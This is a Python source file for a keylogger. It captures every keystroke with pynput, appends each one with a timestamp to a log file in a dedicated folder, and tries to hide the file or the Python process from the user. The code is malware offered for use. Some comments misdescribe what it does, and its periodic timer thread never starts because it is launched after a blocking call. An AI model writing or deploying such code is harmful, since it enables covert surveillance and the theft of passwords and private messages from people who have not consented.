import pynput.keyboard
import os
import subprocess
import threading
import time
import uuid
import datetime

LOG_FILE_NAME = "keylog_" + str(uuid.uuid4()) + ".txt"
LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
LOG_INTERVAL = 60  # Default log interval in seconds
LAST_LOG_TIME = time.time()
LOCK = threading.Lock()

# Function to write the keystrokes to a log file
def write_to_file(key):
    global LAST_LOG_TIME
    with LOCK:
        try:
            # Open or create the log file in append mode
            with open(os.path.join(LOG_DIR, LOG_FILE_NAME), "a") as f:
                # Add timestamp
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {key}\n")
                LAST_LOG_TIME = time.time()
        except Exception as e:
            # Log error to a separate file for better tracking
            with open("error_log.txt", "a") as error_file:
                error_file.write(f"Error writing to file: {e}\n")

# Function to create log directory
def create_log_dir():
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error creating log directory: {e}\n")

# Function to hide the console window
def hide_console():
    try:
        # Hide the console window on Windows systems
        if os.name == "nt":
            subprocess.call("attrib +h " + os.path.join(LOG_DIR, LOG_FILE_NAME), shell=True)
        # Hide the console window on Unix-based systems
        else:
            os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Python\" to false'")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error hiding console: {e}\n")

# Function to start the keylogger
def start_keylogger():
    try:
        # Create log directory
        create_log_dir()
        # Hide the console window
        hide_console()
        # Create a listener for keyboard events
        with pynput.keyboard.Listener(on_press=write_to_file) as listener:
            # Start listening for keyboard events
            listener.join()
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error starting keylogger: {e}\n")

# Function to periodically check if it's time to log keystrokes
def check_log_time():
    global LAST_LOG_TIME
    while True:
        if time.time() - LAST_LOG_TIME >= LOG_INTERVAL:
            write_to_file(" ")
        time.sleep(1)

if __name__ == "__main__":
    # Start the keylogger
    start_keylogger()
    # Start the thread to check log time periodically
    threading.Thread(target=check_log_time, daemon=True).start()
